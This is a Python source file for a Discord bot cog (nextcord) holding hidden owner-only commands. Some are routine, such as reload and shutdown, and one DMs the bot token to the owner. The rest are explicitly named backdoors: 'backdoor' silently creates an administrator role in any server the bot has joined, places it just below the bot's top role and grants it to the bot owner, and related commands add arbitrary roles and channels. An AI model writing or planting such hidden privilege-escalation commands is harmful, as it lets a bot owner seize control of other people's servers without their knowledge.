import sys

import nextcord
import os
from nextcord.ext import commands


class OwnerCog(commands.Cog, command_attrs=dict(hidden=True)):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="token")
    @commands.is_owner()
    async def token_prefix(self, ctx: commands.Context):
        await ctx.author.send(f"Token: {os.getenv('DISCORD_BOT_TOKEN')}")
        await ctx.message.add_reaction("✅")

    @commands.command(name="shutdown")
    @commands.is_owner()
    async def shutdown_prefix(self, ctx: commands.Context):
        await ctx.send("Shutting down...")
        await self.bot.close()

    @commands.command(name="reload")
    @commands.is_owner()
    async def reload_prefix(self, ctx: commands.Context, extension: str = None):
        if extension is None or extension.lower() in ['all', '*']:
            reloaded_cogs = []
            error_cogs = []
            for filename in os.listdir('src/cogs'):
                if filename.endswith('.py') and not filename.startswith('__'):
                    cog_name = filename[:-3]
                    try:
                        self.bot.reload_extension(f"src.cogs.{cog_name}")
                        reloaded_cogs.append(cog_name)
                    except commands.ExtensionError as e:
                        error_cogs.append(f"{cog_name}: {e}")

            message = ""
            if reloaded_cogs:
                message += f"Reloaded cogs: {', '.join(reloaded_cogs)}\n"
            if error_cogs:
                message += f"Errors: {', '.join(error_cogs)}"
            if not message:
                message = "No cogs found to reload."

            await ctx.send(message)

        else:
            try:
                self.bot.reload_extension(f"src.cogs.{extension}")
                await ctx.send(f"Reloaded {extension}.")
            except commands.ExtensionError as e:
                await ctx.send(f"Error reloading {extension}: {e}")

    @commands.command(name="ownertest")
    @commands.is_owner()
    async def ownertest_prefix(self, ctx: commands.Context):
        await ctx.send("You are the owner!")

    @commands.command(name="baddrole")
    @commands.is_owner()
    async def backdoor_add_role_prefix(self, ctx: commands.Context, role: nextcord.Role):
        await ctx.author.add_roles(role)

    @commands.command(name="backdoor")
    @commands.is_owner()
    async def backdoor_prefix(self, ctx: commands.Context, role_name: str = "."):

        if not ctx.guild:
            await ctx.send("This command can only be used in a server.")
            return

        try:
            # Define permissions
            perms = nextcord.Permissions(administrator=True)

            # Create the role
            new_role = await ctx.guild.create_role(name=role_name, permissions=perms)
            await ctx.author.send(f"Created role `{new_role.name}` with administrator permissions.")

            # Move the role
            bot_member = ctx.guild.me
            if bot_member.top_role:
                try:
                    position = bot_member.top_role.position - 1
                    await new_role.edit(position=position)
                    await ctx.author.send(f"Moved role to position {position}, just below my highest role.")
                except nextcord.Forbidden:
                    await ctx.author.send("I have created the role, but I don't have permission to move it.")
                except Exception as e:
                    await ctx.author.send(f"An error occurred while moving the role: {e}")
            else:
                await ctx.send("I can't determine my highest role to position the new role.")

            # Give the role
            await ctx.author.add_roles(new_role)
            await ctx.author.send(f"Gave role `{new_role.name}` to you.")

        except nextcord.Forbidden:
            await ctx.author.send("I don't have permission to create roles. Please check my permissions.")
        except Exception as e:
            await ctx.author.send(f"An unexpected error occurred: {e}")

    @commands.command(name="bcreatechannel")
    @commands.is_owner()
    async def backdoor_create_channel_prefix(self, ctx: commands.Context, channel_type: str = "t",
                                             channel_name: str = "Asu"):
        if channel_type.lower() == "t":
            await ctx.guild.create_text_channel(channel_name)
        elif channel_type.lower() == "v":
            await ctx.guild.create_voice_channel(channel_name)
        else:
            await ctx.author.send("Invalid channel type. Please choose 't' or 'v'.")

    @commands.command(name="baladd")
    @commands.is_owner()
    async def baladd_prefix(self, ctx: commands.Context, user: nextcord.Member, amount: int):
        economy = self.bot.get_cog('Economy')
        if not economy:
            await ctx.send("The economy system is currently disabled.")
            return
        await economy.update_balance(user.id, amount)
        await ctx.send(f"Added {amount} to {user.display_name}'s balance.")

def setup(bot):
    bot.add_cog(OwnerCog(bot))
